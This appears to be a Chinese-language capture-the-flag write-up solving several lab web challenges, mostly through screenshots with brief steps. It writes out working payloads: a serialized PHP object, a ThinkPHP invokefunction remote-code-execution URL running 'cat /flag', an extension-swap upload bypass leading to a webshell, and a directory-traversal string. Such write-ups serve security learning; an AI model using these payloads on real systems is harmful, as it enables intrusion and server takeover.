# unserialize3

![输入图片说明](image/15fa2711e92745328baee503225f3b4b.png)

需要反序列化一下：O:4:"xctf":2:{s:4:"flag";s:3:"111";}

![输入图片说明](image/cbac6546db5c47f4b863b02b93c4937c.png)

# php_rce

![输入图片说明](image/6b3d1a4fa5ec478581e094813023d4f9.png)

题目提示rce漏洞，测试一下：?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

![输入图片说明](image/e9bd6233b8c64069804df30aacf26322.png)

flag：?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag

![输入图片说明](image/a9100c6644304c3ba470c1e2459fb283.png)

# Web_php_include

![输入图片说明](image/ab6cc18c924c46cb9f813637e26a186e.png)

```csharp
show_source(__FILE__);
show_source()是 PHP 的内置函数，其作用是读取并高亮显示指定文件的源代码
__FILE__是 PHP 的魔术常量，代表当前正在执行的脚本文件的完整路径和文件名。所以这行代码的功能是显示当前 PHP 文件的源代码

echo $_GET['hello'];
$_GET是 PHP 的一个超全局变量，用于获取通过GET请求方法传递的参数
这行代码会输出GET请求中名为hello的参数的值

$page=$_GET['page'];
此代码将GET请求中名为page的参数的值赋给变量$page

while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
strstr()是 PHP 的内置函数，用于查找字符串在另一个字符串中首次出现的位置。若找到，则返回从该位置开始到字符串结尾的部分；若未找到，则返回false
str_replace()也是 PHP 的内置函数，用于将字符串中的指定子字符串替换为另一个字符串
这部分代码运用while循环持续检查$page变量中是否包含php://字符串，若包含则将其替换为空字符串，直至$page中不再包含php://

include($page);
include()是 PHP 的内置函数，用于包含并执行指定的文件
这行代码尝试包含并执行$page变量所指定的文件
```

flag

![输入图片说明](image/1a55c1edceca486c8c6676999121a9b4.png)

![输入图片说明](image/cff4af49609747bbac066324cdd4b990.png)

# upload1

![输入图片说明](image/8270f7f2251f4b7fa94c43909523915b.png)

要jpg和png后缀

![输入图片说明](image/56ad16e09da540a19bacec4846044c68.png)

上传以后修改为php后缀

![输入图片说明](image/781bc662ca66405ab7dce73b3b462d76.png)

用蚁剑连接找到flag

![输入图片说明](image/fb48f4f29fb94419855f84216def4d6c.png)

# warmup

![输入图片说明](image/f5e4e169f3844d2bbea65dc83f89a87f.png)

![输入图片说明](image/127c035126c94d6cae8361905a03f79b.png)

查看一下/source.php

![输入图片说明](image/aa90407f143f4c999ad97f0003785bbb.png)

看一下/hint.php

![输入图片说明](image/0f969d3eb34040a290cce8a3664fbb0c.png)

/?file=hint.php?/../../../../ffffllllaaaagggg

![输入图片说明](image/a6cdeac1bd3f420ebe21fd50cca02c75.png)
